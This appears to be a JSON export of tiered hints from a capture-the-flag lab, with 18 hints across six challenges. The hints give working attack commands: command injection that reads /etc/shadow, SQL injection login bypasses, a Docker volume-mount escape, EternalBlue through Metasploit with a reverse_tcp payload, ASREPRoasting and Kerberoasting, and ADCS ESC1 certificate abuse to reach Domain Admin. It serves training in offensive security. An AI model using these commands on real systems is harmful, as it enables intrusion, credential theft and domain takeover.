{"count":18,"results":[{"id":1,"type":"standard","challenge_id":2,"content":"The terminal seems to check if the first command given to it is a valid command (list & read). Try to use a method that allows you to send 2 commands at once (One of the delimeters might help) ","cost":100,"requirements":{"prerequisites":[]},"title":"Hint 1"},{"id":2,"type":"standard","challenge_id":2,"content":"If you can send two commands now, you'll have access to the system itself. There's a lot of files, but we need a file that will give us information about a users password... perhpas a file with the password hash we can use to crack and access their File Transfer Service (FTP) Account","cost":150,"requirements":{"prerequisites":[1]},"title":"Hint 2"},{"id":3,"type":"standard","challenge_id":2,"content":"Given the terminal, send a command like this:\n\"list ; cat /etc/shadow\"\n\nThis will allow you to see the password hashes for users on the system. (You can do the same with other files you think are important) \n\nGiven the hash, use a hash cracking tool like John The Ripper with a common wordlist, such as rockyou.txt, to find the password\n\nWith the username and password, access the FTP Service with those credentials and take a look around. ","cost":300,"requirements":{"prerequisites":[1,2]},"title":"Hint 3"},{"id":4,"type":"standard","challenge_id":4,"content":"Given that the login page is asking for a username and password, there must be a way to bypass one of the checks for a successful login attempt. If you knew the SQL query, it might be easier.","cost":150,"requirements":{"prerequisites":[]},"title":"Hint 1"},{"id":5,"type":"standard","challenge_id":4,"content":"There's various ways to find what users are in the database by using another box. Once you have one of the users, you can do an injection like this:\n\n**Username Field**: stewie' --\n**Password**:  anything\n\nNotice the ' (It's closes the username variable in the SQL query) and the \"--\" comments the rest of the query out so there is no password check. You can just interchange \"stewie\" with any valid username to sign in.","cost":250,"requirements":{"prerequisites":[4]},"title":"Hint 2"},{"id":6,"type":"standard","challenge_id":4,"content":"Sign into the Head.Librarian's Email account with the following:\n**Username**: head.librarian' --\n**Password**: Anything\nWhen looking through the emails, you'll come across a an email with a token string. This token can be detoenized by using the tokenize server VIA Api.\n\nIf you signed into Admin Mickey's account with the following:\n**Username**: mickey' --\n**Password**: Anything\nYou would have seen a document explaining how to use the Token Server API. \nAn API is just an endpoint you can reach to which will do various things based on the value you give it. So in this instance:\nhttp://192.168.10X.3:25565/detokenize/string\nWhere string will be the \"token\" you found. The endpoint in \"detokenize\" and can be changed to other endpoints that are available ","cost":400,"requirements":{"prerequisites":[4,5]},"title":"Hint 3"},{"id":7,"type":"standard","challenge_id":5,"content":"You need to gain access to the Docker Container running SSH, but you don't know the password. There's another service/website you can access with a password you may have found in a previous box.","cost":250,"requirements":{"prerequisites":[]},"title":"Hint 1"},{"id":8,"type":"standard","challenge_id":5,"content":"The password to the website can be found by cracking the password hash for the same username from the Library Terminal. Once you gain access to the website, you'll find a Dockerfile that will tell you the password to the SSH account. You'll also find where \"secret book\" is placed on the host system. This will be useful when trying to access the host files inside the docker container. ","cost":350,"requirements":{"prerequisites":[7]},"title":"Hint 2"},{"id":9,"type":"standard","challenge_id":5,"content":"Once you're inside the docker container, you'll notice that you can access \"docker\" commands. This is because the container was mounted with access to the docker daemon... which has access to the host's files and services. \n\nSince you have full docker access, you can create a new docker image that has the host file system mounted. This a docker escape via volume mount.\n\nThe command you could run is:\n\"docker run -it -v /:/hostfs debian /bin/bash\"\nThis will run a Debian Docker container which has the root file system of the host mounted into a folder called \"hostfs\" in the container. You know the location of secure book from the Dockerfile, so you can go to that directory the same way.","cost":600,"requirements":{"prerequisites":[7,8]},"title":"Hint 3"},{"id":10,"type":"standard","challenge_id":6,"content":"Have you tried looking at which ports are open on the host? Some services, especially ones from the pre-Windows 10 era are surprisingly talkative.","cost":100,"requirements":{"prerequisites":[]},"title":"Hint 1"},{"id":11,"type":"standard","challenge_id":6,"content":"If you find port 445 open, dig into SMB. You might want to use nmap with some safe scripts like --script smb-vuln* to check for known vulnerabilities. Pay attention to anything referencing 2017.","cost":150,"requirements":{"prerequisites":[10]},"title":"Hint 2"},{"id":12,"type":"standard","challenge_id":6,"content":"You're likely dealing with a machine vulnerable to **MS17-010**, a critical flaw in the SMBv1 protocol famously used by EternalBlue. You can confirm this using `nmap` with the `smb-vuln-ms17-010` script:\n    \n`nmap -p445 --script smb-vuln-ms17-010 <target-ip`\n\nIf it comes back as vulnerable, fire up **Metasploit** and use:\n\n    `use exploit/windows/smb/ms17_010_eternalblue`\n    \nSet the target IP and payload (try `windows/x64/meterpreter/reverse_tcp`), then `run`. If successful, you\u2019ll get a SYSTEM shell.","cost":300,"requirements":{"prerequisites":[10,11]},"title":"Hint 3"},{"id":13,"type":"standard","challenge_id":7,"content":"Start by checking if you can anonymously query the domain controller\u2019s LDAP service. Tools like ldapsearch, crackmapexec, or netexec can often pull down usernames with no credentials needed.","cost":150,"requirements":{"prerequisites":[]},"title":"Hint 1"},{"id":14,"type":"standard","challenge_id":7,"content":"Some users don\u2019t require pre-authentication for Kerberos, which means you can request their encrypted tickets and try cracking them offline. Try tools like GetNPUsers.py or netexec to do this. Keep an eye out for accounts that don\u2019t need preauth.","cost":250,"requirements":{"prerequisites":[13]},"title":"Hint 2"},{"id":15,"type":"standard","challenge_id":7,"content":"3. Once you've dumped a list of users (e.g., via anonymous LDAP bind), you can check which ones are vulnerable to **ASREPRoasting**\u2014meaning they don't require Kerberos pre-auth. Use `GetNPUsers.py` from Impacket like so:\n    \n    `GetNPUsers.py 'domain.local/' -usersfile usernames.txt -dc-ip <DC-IP> -no-pass`\n    \n    Crack the resulting hashes in **Hashcat** using mode `18200`. Example:\n    \n    `hashcat -m 18200 hashes.txt /path/to/rockyou.txt`\n    \n    Once you get valid creds, use them to perform **Kerberoasting**:\n    \n    `GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP>`\n    \n    This will give you service tickets you can again crack offline using Hashcat mode `13100`.\n    \n    If you\u2019re successful, you\u2019ll get plaintext creds for a **Domain Admin** service account. With that, try:\n\n`evil-winrm -i <DC-IP> -u <domain admin> -p <password>`\n\n\n","cost":400,"requirements":{"prerequisites":[13,14]},"title":"Hint 3"},{"id":16,"type":"standard","challenge_id":8,"content":"If you're logged in as a low-privileged domain user, check whether **Active Directory Certificate Services** is enabled on the domain. You can do this with:\n    \n    `certipy find -dc-ip <DC-IP> -u <USER> -p <PASS>`","cost":250,"requirements":{"prerequisites":[]},"title":"Hint 1"},{"id":17,"type":"standard","challenge_id":8,"content":"You\u2019re looking for a certificate **template** that:\n    - Allows *Authenticated Users* to enroll\n    - Has **ENROLLEE_SUPPLIES_SUBJECT** enabled, letting you request a cert for any user\n    \n    Certipy will flag this as **ESC1**:\n    \n    `certipy find -u <USER> -p <PASS> -dc-ip <DC-IP> --vulnerable`\n    \n    Check the output carefully for `ESC1` under the `Vulnerabilities` column.","cost":350,"requirements":{"prerequisites":[16]},"title":"Hint 2"},{"id":18,"type":"standard","challenge_id":8,"content":"Once you\u2019ve found a vulnerable template (say, `UserCertTemplate`), you can request a certificate **as the Domain Administrator** using Certipy:\n    \n  `certipy req -u <YOURUSER> -p <YOURPASS> -dc-ip <DC-IP> -ca <CA_NAME> -template UserCertTemplate -alt-name Administrator`\n    \n    This will generate a `.pfx` file (e.g., `administrator.pfx`). Then, authenticate as the Domain Admin using:\n    \n    `certipy auth -pfx administrator.pfx -dc-ip <DC-IP>`\n    \n    Now you have Domain Admin access. From here, use `secretsdump`, `smbclient`, or `evil-winrm` to access the system:\n    \n    `evil-winrm -i <DC-IP> -u Administrator -k`\n    ","cost":600,"requirements":{"prerequisites":[16,17]},"title":"Hint 3"}],"meta":{}}